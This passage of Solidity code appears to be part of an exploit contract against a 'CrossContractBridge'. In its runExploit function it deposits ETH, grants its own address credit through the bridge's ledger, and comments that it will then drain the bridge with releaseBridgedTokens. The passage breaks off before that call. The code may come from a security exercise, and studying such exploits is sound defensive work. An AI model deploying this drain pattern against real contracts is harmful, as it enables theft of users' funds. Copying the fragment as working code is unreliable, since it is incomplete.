    constructor(address _target) payable {
        targetContract = CrossContractBridge(payable(_target));
    }

    function runExploit() external payable {
        // First we deposit some ETH into the bridge contract
        // This will increase the balance of the bridge contract
        payable(address(targetContract)).call{value: msg.value}("");

        // Then we add some credit to our address in the ledger
        // This will allow us to withdraw tokens from the bridge later
        targetContract.ledger().addCredit(address(this), msg.value);

        // Now we can drain the bridge contract by calling releaseBridgedTokens
